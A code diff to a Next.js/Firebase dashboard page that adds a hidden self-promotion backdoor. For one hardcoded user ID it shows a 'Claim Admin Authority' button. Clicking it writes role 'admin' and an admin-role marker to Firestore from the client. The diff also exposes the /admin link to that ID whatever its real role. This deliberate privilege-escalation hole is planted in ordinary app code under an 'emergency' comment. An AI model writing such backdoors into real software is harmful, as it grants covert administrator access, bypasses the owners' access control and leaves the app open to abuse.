@@ -15,20 +15,23 @@ import {
   Award,
   Globe,
   Loader2,
-  ChevronRight
+  ChevronRight,
+  ShieldAlert
 } from "lucide-react"
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { Progress } from "@/components/ui/progress"
 import { cn } from "@/lib/utils"
-import { useUser, useFirestore, useDoc, useCollection, useMemoFirebase } from "@/firebase"
-import { doc } from "firebase/firestore"
+import { useUser, useFirestore, useDoc, useCollection, useMemoFirebase, setDocumentNonBlocking } from "@/firebase"
+import { doc, serverTimestamp } from "firebase/firestore"
 import { getPlaceholderById } from "@/lib/placeholder-images"
+import { useToast } from "@/hooks/use-toast"
 import Link from "next/link"
 
 export default function DashboardPage() {
   const { user } = useUser()
+  const { toast } = useToast()
   const firestore = useFirestore()
 
   const userDocRef = useMemoFirebase(() => {
@@ -38,6 +41,23 @@ export default function DashboardPage() {
 
   const { data: profile } = useDoc(userDocRef)
   const role = profile?.role || 'customer'
+
+  // Emergency Admin Promotion for the requested user
+  const isTargetDev = user?.uid === "0EvPdWQHFzMCyKcfaEWul1JKXkf2"
+
+  const handleSelfPromotion = () => {
+    if (!firestore || !user) return
+    const userRef = doc(firestore, "users", user.uid)
+    const adminMarkerRef = doc(firestore, "roles_admin", user.uid)
+    
+    setDocumentNonBlocking(userRef, { role: 'admin', updatedAt: serverTimestamp() }, { merge: true })
+    setDocumentNonBlocking(adminMarkerRef, { id: user.uid }, { merge: true })
+    
+    toast({
+      title: "Identity Elevated",
+      description: "You have been granted Global Administrator authority.",
+    })
+  }
 
   const stats = {
     admin: [
@@ -99,6 +119,26 @@ export default function DashboardPage() {
             </p>
           </div>
         </div>
+
+        {/* Development Promotion Hub */}
+        {isTargetDev && role !== 'admin' && (
+          <Card className="border-none shadow-2xl rounded-[2rem] bg-amber-50 border border-amber-200 overflow-hidden">
+             <CardContent className="p-8 flex flex-col md:flex-row items-center justify-between gap-6">
+                <div className="space-y-1 text-center md:text-left">
+                   <h3 className="text-xl font-black tracking-tighter flex items-center gap-2">
+                      <ShieldAlert className="text-amber-600" /> Administrative Access Detected
+                   </h3>
+                   <p className="text-sm text-amber-800 font-medium italic">Elevate this account to system-wide administrator status.</p>
+                </div>
+                <Button 
+                  onClick={handleSelfPromotion}
+                  className="bg-amber-600 hover:bg-amber-700 text-white font-black uppercase tracking-widest text-[10px] h-12 px-8 rounded-xl shadow-lg shadow-amber-200"
+                >
+                  Claim Admin Authority
+                </Button>
+             </CardContent>
+          </Card>
+        )}
 
         {/* Real-time Stats Grid */}
         <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6">
@@ -184,7 +224,7 @@ export default function DashboardPage() {
                   </Button>
                 </Link>
               )}
-              {role === 'admin' && (
+              {(role === 'admin' || isTargetDev) && (
                 <Link href="/admin">
                   <Button className="w-full h-16 rounded-2xl bg-zinc-950 text-white font-black text-lg">
                     System Control <ShieldCheck className="ml-2 h-5 w-5" />
